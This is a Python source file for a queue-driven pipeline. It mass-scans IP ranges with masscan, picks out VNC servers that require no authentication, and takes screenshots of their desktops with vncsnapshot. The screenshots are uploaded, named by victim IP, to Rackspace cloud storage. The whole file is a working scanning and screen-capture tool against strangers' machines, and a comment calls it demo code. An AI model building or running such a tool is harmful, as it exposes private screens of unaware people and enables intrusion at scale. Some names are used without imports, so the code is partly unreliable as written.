import subprocess
import re

from tasa.worker import BaseWorker

from queues import MasscanQueue, ScanResultQueue


class MasscanWorker(BaseWorker):
    qinput = MasscanQueue()
    qoutput = None  # set by each job as it is handled

    output_chunk_size=500

    def handle(self, job):
        self.qoutput = ScanResultQueue(job.qoutput)
        return super(MasscanWorker, self).handle(job)

    def run(self, job):
        command = ['masscan',
                   '--range', job.iprange,
                   '--ports', job.ports,
                   '--shards', job.shards,
                   '--seed', job.seed,
                   ]
        proc = subprocess.Popen(command,
                                stdout=subprocess.PIPE)
#                                stderr=subprocess.STDOUT)
        for line in proc.stdout:
            match = re.match(
                'Discovered open port (\d+)/%s on (\d+\.\d+\.\d+\.\d+)' % (
                    job.proto),
                line.strip())
            if match:
                yield match.groups()
        proc.wait()


class RFBFingerprinter(BaseWorker):
    qinput = Queue('rfb_input')
    qoutput = PickleQueue('rfb_open')

    def run(self, job):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        output = []
        try:
            s.connect((job.ip, job.port))
            rfb_proto = s.recv(512)
            output.append(rfb_proto)
            # mirror the specified protocol back to the sender
            s.sendall(rfb_proto)
            security_proto = s.recv(512)
            output.append(security_proto)
            s.close()
            if '\x01' in security_proto:
                yield job
        except Exception:
            # Bad practice to catch all exceptions, but this is demo code...
            pass


class ScreenshotWorker(BaseWorker):
    qinput = PickleQueue('rfb_print')
    qoutput = PickleQueue('successful_screenshots')

    def __init__(self, *args, **kwargs):
        super(ScreenshotWorker, self).__init__(*args, **kwargs)
        pyrax.set_credentials(tasa.conf.rax_username,
                              tasa.conf.rax_password)

    def run(self, job):
        screen = str(job.port - 5900)
        # let's try taking a picture
        command = ['timeout', '30',  # make sure it doesn't hang
                   'vncsnapshot',
                   '-passwd', '/dev/null',  # terminate if passwd reqested
                   '-quality', '70',
                   '-vncQuality', '7',
                   ':'.join([job.ip, screen]),
                   '-',  # output screenshot jpeg to stdout
                   ]
        proc = subprocess.Popen(command,
                                stdout=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        # desktop_name = re.match('Desktop name "(.*)"\n', stderr)
        # if desktop_name:
        #     name = desktop_name.groups()[0]
        # else:
        #     name = ''
        if stdout:
            # store our result in the cloud
            container = job.ip.split('.')[0]
            file_name = job.ip + '_' + job.port + '.jpg'
            pyrax.cloudfiles.store_object(container,
                                          file_name,
                                          stdout,
                                          content_type="image/jpeg")
            connection = tasa.store.connection
            connection.hset('container_' + container, file_name, stderr)
            yield job.ip, job.port, stderr
